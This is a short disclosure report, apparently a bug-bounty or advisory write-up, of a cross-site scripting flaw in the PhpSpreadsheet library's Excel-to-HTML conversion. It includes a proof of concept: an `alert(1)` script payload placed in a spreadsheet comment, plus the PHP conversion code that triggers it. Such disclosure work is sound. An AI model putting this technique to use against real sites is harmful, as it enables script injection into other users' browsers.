# Overview

`PHPOffice/PhpSpreadsheet` is a library written in pure PHP and offers a set of classes that allow you to read and write various spreadsheet file formats such as Excel and LibreOffice Calc.

This Package is vulnerable to Cross-site Scripting when creating an html output from excel file.

# POC

1. Setup Project
2. Create an excel file -> Insert Comment -> Insert Payload `<script>alert(1)</script>`
3. Move the file to the project dir
4. Create a php file with filename `convert-excel-to-html.php` -> Insert code below
```
<?php

require './vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\IOFactory;

$filename = 'INSERT_YOUR_EXCEL_FILE_HERE';

$spreadsheet = IOFactory::load('./'.$filename);
$writer = IOFactory::createWriter($spreadsheet, 'Html');

$filename = 'testxss.html';
$writer->save($filename);
```
5. Open Project dir in terminal -> run command `php convert-excel-to-html.php`
6. `testxss.html` html file will be generated in project root dir
7. Open generated html file with filename `testxss.html`on Browser
8. Verify that the payload will be triggered


